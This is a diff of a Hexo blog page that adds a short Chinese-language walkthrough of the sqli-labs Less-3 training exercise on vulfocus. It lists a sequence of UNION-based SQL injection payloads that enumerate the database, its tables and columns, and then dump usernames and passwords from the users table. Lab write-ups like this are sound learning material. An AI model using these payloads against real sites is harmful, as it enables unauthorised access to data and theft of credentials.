@@ -5,18 +5,28 @@
   
 
   
-  <title>vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-3 | Hexo</title>
+  <title>vulfocus/sqli-labs  Less3  SQLI DUMB SERIES-3 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="vulfocus&#x2F;sqli-labs  Less1  SQLI DUMB SERIES-3">
+  <meta name="description" content="输入?id&#x3D;1与之前出现页面一样，输入?id&#x3D;1’后报错     输入?id&#x3D;-1’) union select 1,2,3 –+      输入?id&#x3D;-1’) union select 1,2,database(); –+  报出用户名信息     输入?id&#x3D;-1’) union select 1,2,group_concat(table_name) from information_sch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulfocus&#x2F;sqli-labs  Less3  SQLI DUMB SERIES-3">
 <meta property="og:url" content="http://example.com/2022/03/24/SERIES-3/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="输入?id&#x3D;1与之前出现页面一样，输入?id&#x3D;1’后报错     输入?id&#x3D;-1’) union select 1,2,3 –+      输入?id&#x3D;-1’) union select 1,2,database(); –+  报出用户名信息     输入?id&#x3D;-1’) union select 1,2,group_concat(table_name) from information_sch">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/1.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/2.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/3.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/4.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/5.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/6.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-3/7.png">
 <meta property="article:published_time" content="2022-03-24T12:57:13.000Z">
-<meta property="article:modified_time" content="2022-03-24T12:58:04.252Z">
+<meta property="article:modified_time" content="2022-03-24T23:38:35.182Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/24/SERIES-3/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -79,7 +89,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-3
+      vulfocus/sqli-labs  Less3  SQLI DUMB SERIES-3
     </h1>
   
 
@@ -87,7 +97,39 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>输入?id=1与之前出现页面一样，输入?id=1’后报错</p>
+<img src="/2022/03/24/SERIES-3/1.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,3 –+ </p>
+<img src="/2022/03/24/SERIES-3/2.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,database(); –+ </p>
+<p>报出用户名信息</p>
+<img src="/2022/03/24/SERIES-3/3.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ –+<br>查看security数据库</p>
+<img src="/2022/03/24/SERIES-3/4.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’user’ –+<br>查询数据库的表</p>
+<img src="/2022/03/24/SERIES-3/5.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(username) from security.users –+<br>查询user表</p>
+<img src="/2022/03/24/SERIES-3/6.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(password) from security.users –+<br>查询密码</p>
+<img src="/2022/03/24/SERIES-3/7.png" class="">
       
     </div>
     <footer class="article-footer">
@@ -105,7 +147,7 @@
   
     <a href="/2022/03/24/SERIES-2/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-2</div>
+      <div class="article-nav-title">vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2</div>
     </a>
   
 </nav>
@@ -156,11 +198,11 @@
       <ul>
         
           <li>
-            <a href="/2022/03/24/SERIES-3/">vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-3</a>
+            <a href="/2022/03/24/SERIES-3/">vulfocus/sqli-labs  Less3  SQLI DUMB SERIES-3</a>
           </li>
         
           <li>
-            <a href="/2022/03/24/SERIES-2/">vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-2</a>
+            <a href="/2022/03/24/SERIES-2/">vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2</a>
           </li>
         
           <li>
